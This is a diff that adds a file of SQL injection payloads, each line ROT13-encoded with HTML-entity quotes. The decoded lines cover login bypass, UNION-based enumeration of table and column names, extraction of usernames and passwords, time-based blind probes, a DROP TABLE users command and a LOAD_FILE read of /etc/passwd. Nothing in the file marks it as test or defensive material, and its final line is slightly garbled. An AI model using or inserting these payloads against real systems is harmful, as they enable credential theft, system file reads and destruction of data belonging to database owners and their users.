@@ -1,0 +1,20 @@
+&#k27; BE 1=1--
+&#k27; BE &#k27;1&#k27;=&#k27;1
+&#k27; HAVBA FRYRPG ahyy, ahyy--
+&#k27; HAVBA FRYRPG 1, @@irefvba--
+&#k27; HAVBA FRYRPG 1, gnoyr_anzr SEBZ vasbezngvba_fpurzn.gnoyrf--
+&#k27; HAVBA FRYRPG 1, pbyhza_anzr SEBZ vasbezngvba_fpurzn.pbyhzaf JURER gnoyr_anzr=&#k27;hfref&#k27;--
+&#k27; HAVBA FRYRPG hfreanzr, cnffjbeq SEBZ hfref--
+&#k27; NAQ FYRRC(5)--
+&#k27;; QEBC GNOYR hfref--
+&#k27; BE 1=1 YVZVG 1--
+&#k27; BEQRE OL 1--
+&#k27; BEQRE OL 3--
+&#k27; NAQ (FRYRPG PBHAG(*) SEBZ hfref) &#k3r; 0--
+&#k27; NAQ NFPVV(FHOFGEVAT((FRYRPG cnffjbeq SEBZ hfref YVZVG 1),1,1)) &#k3r; 65--
+&#k27; HAVBA FRYRPG 1, YBNQ_SVYR(&#k27;/rgp/cnffjq&#k27;)--
+&#k27; HAVBA FRYRPG 1, hfre()--
+&#k27; HAVBA FRYRPG 1, qngnonfr()--
+&#k27; NAQ 1=VS(1=1, FYRRC(3), 0)--
+&#k27; BE RKVFGF(FRYRPG * SEBZ hfref JURER hfreanzr=&#k27;nqzva&#k27;)--
+&#k27; HAVBA FRYRPG tebhc_pbapng(gnoyr_anzr),2 SEBZ vasbezngvba_fpurzn.gnoyrf JURER gnoyr_fpurzn=qngnonfr()&#k2014;
